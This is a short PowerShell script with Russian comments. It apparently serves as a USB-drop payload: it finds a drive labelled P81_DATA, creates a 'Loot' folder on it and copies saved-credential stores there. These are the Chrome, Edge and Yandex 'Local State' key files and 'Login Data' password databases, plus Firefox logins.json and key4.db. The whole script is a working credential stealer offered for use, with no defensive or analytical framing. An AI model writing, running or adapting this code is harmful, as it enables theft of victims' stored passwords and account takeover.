# 1. Поиск флешки P81_DATA
$u = Get-Volume | Where-Object { $_.FileSystemLabel -eq 'P81_DATA' } | Select-Object -ExpandProperty DriveLetter
if (!$u) { exit }

# 2. Папка назначения
$d = "$($u):\Loot\$(Get-Date -Format 'HH_mm_ss')"
New-Item -ItemType Directory -Path $d -Force | Out-Null

# 3. Сбор Chromium (Chrome, Edge, Yandex)
$bList = @(
    @{n="CHROME"; p="Google\Chrome\User Data"},
    @{n="EDGE"; p="Microsoft\Edge\User Data"},
    @{n="YANDEX"; p="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $bList) {
    $p = Join-Path $env:LOCALAPPDATA $b.p
    if (Test-Path $p) {
        $prefix = $b.n
        
        # КЛЮЧИ: Копируем Local State и сразу делаем текстовую копию .txt
        $ls = Join-Path $p "Local State"
        if (Test-Path $ls) {
            Copy-Item $ls -Destination "$d\$($prefix)_LocalState_ORIGINAL" -Force
            # Создаем текстовый дубликат, который легко прочитать
            cmd /c copy /y "$ls" "$d\$($prefix)_KEY_READ_ME.txt"
        }
        
        # ПАРОЛИ: Поиск и копирование баз
        Get-ChildItem -Path $p -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
            $prof = $_.Directory.Name
            $target = "$d\$($prefix)_$($prof)_LoginData.db"
            cmd /c copy /y "$($_.FullName)" "$target"
        }
    }
}

# 4. Сбор Firefox
$ff = "$env:APPDATA\Mozilla\Firefox\Profiles"
if (Test-Path $ff) {
    Get-ChildItem -Path $ff -Directory | ForEach-Object {
        $src = $_.FullName
        $name = $_.Name
        cmd /c copy /y "$src\logins.json" "$d\FF_$($name)_logins.json"
        cmd /c copy /y "$src\key4.db" "$d\FF_$($name)_key4.db"
    }
}

exit
